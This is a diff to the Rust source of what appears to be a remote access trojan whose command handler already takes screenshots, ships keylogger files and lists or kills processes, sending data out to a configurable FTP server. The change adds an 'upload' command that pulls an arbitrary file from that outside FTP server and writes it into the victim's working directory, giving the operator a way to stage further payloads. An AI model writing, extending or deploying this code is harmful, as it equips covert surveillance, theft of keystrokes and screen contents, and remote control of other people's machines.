@@ -3,6 +3,7 @@ extern crate repng;
 extern crate serde;
 
 use serde::{Serialize, Deserialize};
+use std::io::Write;
 use std::process::Stdio;
 use execute::{Execute, command};
 use ftp::{FtpError, FtpStream};
@@ -28,6 +29,7 @@ const SEND_PIC_COMMAND: &'static str = "pic";
 const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
 const SEND_PROCESS_LIST_COMMAND: &'static str = "proclist";
 const KILL_COMMAND: &'static str = "kill";
+const UPLOAD_COMMAND: &'static str = "upload";
 const UNKNOWN_COMMAND: &'static str = "Unknown command";
 
 //Enter your data for FTP Server connection
@@ -35,6 +37,8 @@ const FTP_USER_NAME: &'static str = "enter_ftp_user_name";
 const FTP_PASS_NAME: &'static str = "enter_ftp_user_password";
 const FTP_ADDRESS_NAME: &'static str = "enter_ftp_server_ip_address";
 const FTP_FOLDER_NAME: &'static str = "enter_ftp_folder_name";
+
+const FTP_STD_PORT: u16 = 21;
 
 pub trait FleaCommand
 {
@@ -299,15 +303,25 @@ impl CommandProcessor
         return Ok(data);
     }
     
-    /// Sends a file to a remote FTP server
+    /// Writes data to a file on disk
+    /// * file_name - a path with a name where the data will be written to
+    /// * data - array od u8 bytes to save in a file
+    fn write_file(&self, file_name: PathBuf, data: Vec<u8>) -> std::io::Result<()>
+    {
+        let mut file = File::create(file_name)?;
+
+        file.write_all(&data)?;
+
+        Ok(())
+    }
+    
+    /// Sends a file to remote FTP server
     /// * addr - an FTP server address
     /// * user - login name
     /// * pass - password
     /// * file_path - a path to the file to be sent
     fn send_file_to_ftp(&self, addr: &str, user: &str, pass: &str, file_path: &PathBuf) -> Result<(), FtpError>
     {
-        const FTP_STD_PORT: u16 = 21;
-
         let mut ftp_stream = FtpStream::connect((addr, FTP_STD_PORT))?;
 
         ftp_stream.login(user, pass)?;
@@ -332,6 +346,52 @@ impl CommandProcessor
                 return Err(FtpError::InvalidResponse(x.to_string()))
             }
         };
+
+        ftp_stream.quit()
+    }
+
+    /// Receives a file from remote FTP server
+    /// * addr - an FTP server address
+    /// * user - login name
+    /// * pass - password
+    /// * file_name - a file name to download from FTP server
+    fn receive_file_from_ftp(&self, addr: &str, user: &str, pass: &str, file_name: &str) -> Result<(), FtpError>
+    {
+        let mut ftp_stream = FtpStream::connect((addr, FTP_STD_PORT))?;
+
+        ftp_stream.login(user, pass)?;
+    
+        debug!("Connected to FTP server.");
+
+        ftp_stream.cwd(&self.conf.ftp_folder)?;
+
+        match ftp_stream.simple_retr(file_name)
+        {
+            Ok(x) =>
+            {
+                let file_path = self.current_directory.join(file_name);
+                match self.write_file(file_path, x.into_inner())
+                {
+                    Ok(_) =>
+                    {
+                        debug!("File received from FTP server");
+                    },
+                    Err(x) =>
+                    {
+                        error!("Couldn't write a file to disk:{}", x.to_string());                
+                        ftp_stream.quit()?;
+                        return Err(FtpError::InvalidResponse(x.to_string()))        
+                    }
+                }
+                
+            },
+            Err(y) =>
+            {
+                error!("Couldn't receive the file from FTP server:{}", y.to_string());                
+                ftp_stream.quit()?;
+                return Err(FtpError::InvalidResponse(y.to_string()))
+            }
+        }
 
         ftp_stream.quit()
     }
@@ -393,6 +453,21 @@ impl FleaCommand for CommandProcessor
             KILL_COMMAND =>
             {
                 return self.kill_process(value)
+            },
+
+            UPLOAD_COMMAND =>
+            {
+                match self.receive_file_from_ftp(&self.conf.ftp_address, &self.conf.ftp_user, &self.conf.ftp_pass, value)
+                {
+                    Ok(_) =>
+                    {
+                        return "File uploaded".to_string();
+                    },
+                    Err(x) =>
+                    {
+                        return x.to_string();
+                    }
+                }
             },
 
             SEND_KEY_LOGGER_FILE_COMMAND =>
